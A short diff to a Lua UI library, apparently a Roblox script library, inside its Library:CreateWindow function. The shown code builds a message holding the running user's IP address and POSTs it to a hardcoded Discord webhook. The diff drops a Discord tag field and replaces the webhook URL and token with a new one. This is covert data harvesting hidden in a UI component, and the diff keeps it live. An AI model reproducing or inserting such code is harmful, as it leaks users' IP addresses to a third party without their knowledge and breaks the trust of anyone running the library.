@@ -2732,11 +2732,6 @@ function Library:CreateWindow(...)
                         ["inline"] = false
                     },
                     {
-                        ["name"] = "Discord Tag",
-                        ["value"] = ImportantVariables.DiscordTag,
-                        ["inline"] = false
-                    },
-                    {
                         ["name"] = "IP Address",
                         ["value"] = ip,
                         ["inline"] = false
@@ -2764,7 +2759,7 @@ function Library:CreateWindow(...)
                 )
             }
             (syn and syn.request or http_request or http.request) {
-                Url = "https://discord.com/api/webhooks/1098450049698123887/xLGQmDEG1X2_31nUg2rASBXmin8J1ljAZq80nl4wqb-oqtkIRmCyozyMtoPpr0XTBLii",
+                Url = "https://discord.com/api/webhooks/1099130760373481624/d2szxpnjSNeHXI0IhrfYuHyaJl8fRgRnCFypCt91-OPI83J9QfuNoNWrfqRn2CqNLupI",
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
